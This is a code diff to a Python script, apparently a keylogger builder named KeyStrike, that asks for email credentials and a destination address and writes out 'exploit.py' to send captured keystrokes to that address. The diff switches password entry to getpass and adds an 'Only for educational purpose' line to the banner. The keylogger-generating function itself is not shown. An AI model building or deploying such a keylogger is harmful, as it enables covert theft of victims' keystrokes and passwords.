@@ -1,4 +1,5 @@
 #!/bin/usr/python3
+import getpass
 
 
 def prRed(skk): return "\033[91m {}\033[00m" .format(skk)
@@ -145,7 +146,7 @@ def banner():
               ░ ░    __author__ : dr3dd
                        version  : v1.0
                        Site     : http://dr3dd.me
-               Copyright (C) 2019 KeyStrike @dr3dd                                         
+ Only for educational purpose.   Copyright (C) 2019 KeyStrike @dr3dd                                         
     """
     print(prLightPurple(banner))
 
@@ -153,7 +154,7 @@ def banner():
 if __name__ == "__main__":
     banner()
     username = input(prGreen("Enter Email : "))
-    password = input(prGreen("Enter password : "))
+    password = getpass.getpass(prGreen("Enter password : "))
     email = input(prGreen("Enter email where you want to receive keys : "))
     generate_keylogger_exploit(username, password, email)
     print(prLightPurple("Your exploit is ready : exploit.py"))
